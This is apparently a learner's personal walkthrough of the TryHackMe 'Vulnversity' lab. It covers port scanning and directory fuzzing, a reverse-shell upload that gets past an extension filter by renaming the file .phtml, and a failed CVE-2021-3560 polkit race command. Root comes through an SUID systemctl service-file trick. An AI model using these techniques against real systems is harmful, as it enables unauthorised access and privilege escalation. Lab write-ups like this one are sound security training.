---
title: "vulnVersity"
tags:
  - fetus
---
- room link: https://tryhackme.com/room/vulnversity
# start 
## nmap results:
- `nmap -p- -sCV -T4 10.10.84.211 -oN Dscan.txt`:
```sh
# Nmap 7.95 scan initiated Fri Jul 18 19:19:18 2025 as: /usr/lib/nmap/nmap -p- -sCV -T4 -oN Dscan.txt 10.10.84.211
Nmap scan report for 10.10.84.211
Host is up (0.18s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ed:2a:e3:6e:d3:46:50:6a:06:2a:43:3a:79:1b:ce:ca (RSA)
|   256 e9:f4:58:df:65:46:1d:fc:43:27:48:37:40:1d:b4:8d (ECDSA)
|_  256 72:51:09:2a:44:73:63:60:49:b9:ed:37:4c:75:1b:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Vuln University
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-07-18T23:33:36
|_  start_date: N/A
|_nbstat: NetBIOS name: IP-10-10-84-211, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 18 19:33:47 2025 -- 1 IP address (1 host up) scanned in 869.11 seconds
```
## http enum:
- huh a professional course selling site. lets do some directory busting and fuzzing
### [[ffuf]] result:
- `ffuf -u http://10.10.84.211:3333/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt`:
```sh

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.84.211:3333/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4517ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4680ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4682ms]
css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 221ms]
fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 177ms]
images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 190ms]
internal                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 192ms]
index.html              [Status: 200, Size: 33014, Words: 8161, Lines: 653, Duration: 206ms]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 180ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 181ms]
:: Progress: [4746/4746] :: Job [1/1] :: 40 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
```
### [[feroxbuster]] result:
- `feroxbuster --url http://10.10.84.211:3333/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough`:
	- [[vulnVersityFeroxBusterResult]] 

## access + more http enum:
file upload at `/internal/`. tried to upload a normal php reverse shell from `/usr/share/webshells/php/php-reverse-shell.php` but it said `Extention not allowed`. it did take `phtml` so uploaded it that way. couldnt access the file at `/internal/php-reverse-shell.phtml`. its probably inside the `/internal/` directory. lets do some fuzzing again with [[ffuf]] :D

### [[ffuf]] result 2:
- `ffuf -u http://10.10.84.211:3333/internal/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt`:
```sh
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.84.211:3333/internal/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 177ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3471ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4485ms]
css                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 183ms]
index.php               [Status: 200, Size: 525, Words: 62, Lines: 27, Duration: 182ms]
uploads                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 181ms]
:: Progress: [4746/4746] :: Job [1/1] :: 215 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```

theres an uploads directory. got the shell at `/internal/uploads/php-reverse-shell.phtml` <br>
![[vulnVersityGotAShellSS.png]]
stabilised the shell with [[python-tty-shell]] and did `export TERM=xterm` to get `clear` working. did `awk -F: '{print $1 ":" $3 ":" $7}' /etc/passwd` to get a list of users with shells on the machine. heres the list:
```sh
root:0:/bin/bash
daemon:1:/usr/sbin/nologin
bin:2:/usr/sbin/nologin
sys:3:/usr/sbin/nologin
sync:4:/bin/sync
games:5:/usr/sbin/nologin
man:6:/usr/sbin/nologin
lp:7:/usr/sbin/nologin
mail:8:/usr/sbin/nologin
news:9:/usr/sbin/nologin
uucp:10:/usr/sbin/nologin
proxy:13:/usr/sbin/nologin
www-data:33:/usr/sbin/nologin
backup:34:/usr/sbin/nologin
list:38:/usr/sbin/nologin
irc:39:/usr/sbin/nologin
gnats:41:/usr/sbin/nologin
nobody:65534:/usr/sbin/nologin
systemd-timesync:100:/bin/false
systemd-network:101:/bin/false
systemd-resolve:102:/bin/false
syslog:104:/bin/false
_apt:105:/bin/false
lxd:106:/bin/false
messagebus:107:/bin/false
uuidd:108:/bin/false
dnsmasq:109:/bin/false
sshd:110:/usr/sbin/nologin
ftp:111:/bin/false
bill:1000:/bin/bash
pollinate:103:/bin/false
landscape:112:/usr/sbin/nologin
tcpdump:113:/usr/sbin/nologin
systemd-coredump:999:/usr/sbin/nologin
usbmux:114:/usr/sbin/nologin
ubuntu:1001:/bin/bash
```
seems like user `bill` has a bash shell. found the user flag at `/home/bill/user.txt`. now to do some priv esc
## priv esc:
- ah you know what writing in paragraphs just isnt my thing ill go back to short list items as usual -\_\_-
- lets upload and run linpeas and see what we get 
- two `YELLOW/RED`s:
	1. `Vulnerable to CVE-2021-3560`
	2. `-rwsr-xr-x 1 root root 974K Jun 17  2024 /bin/systemctl`
### (FAILED) priv esc with CVE-2021-3560 (polkit):
- well what is polkit? its basically the UAC of linux kind of. decides weather or not you're allowed to do stuff that requires higher privileges. its what runs under the hood when you see the auth popup boxes
- the exploitation of polkit (at least the way we're gonna do it) relies on these two packages being installed:
	- `accountsservice`
	- `gnome-control-center`
- these two packages are installed by default on graphical systems like Ubuntu Desktop. if not using a graphical system and instead using something non graphical like an RHEL server. those packages wont be installed and can be with this command:
```sh
sudo yum install accountsservice gnome-control-center
```
- to trigger the vuln we need to start a `dbus-send` command and kill it while polkit is still processing the request. thats theoretically possible by just doing ctrl+C at the right moment but thats just unreasonable lol. to figure out when to kill it. we need to first figure out how long it normally takes to run it normally. heres the command to do that:
```  sh
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1
```
- outputs after running it multiple times:
```sh
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required

real    0m0.262s
user    0m0.001s
sys     0m0.000s



Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required

real    0m0.006s
user    0m0.001s
sys     0m0.000s



Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required

real    0m0.006s
user    0m0.001s
sys     0m0.000s



Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required

real    0m0.006s
user    0m0.001s
sys     0m0.000s
```
- so it takes around 6 milliseconds for me. so we need to kill the `dbus-send` command after about 3 or 4 milliseconds. heres the command to do it:
```sh
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.003s ; kill $!
```
- tried it around 20 times. didnt work. i guess it was a false positive? played around with the timing as well but just couldnt get it to work. lets move on the low hanging fruit aka systemctl :v ig ill solve the dedicated polkit room to actually exploit this one
### priv esc with SUID systemctl:
- went to gtfobins like usual and this is what it says: <br>
![[vulnVersityGtfobinsSS.png]]
- commands given:
```sh
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```
- POC:<br>
![[vulnVersityPOCSS.png]]
- lets make bash SUID so we can get root easily :D or better yet just inject a user with `uid` set to `0` (see [[partialRootToFullRootChecklist]] to get the command): <br>
![[vulnVersityHasBeenRooted.png]]
- we got root :D
# end 
- meh was easy as hell :/ 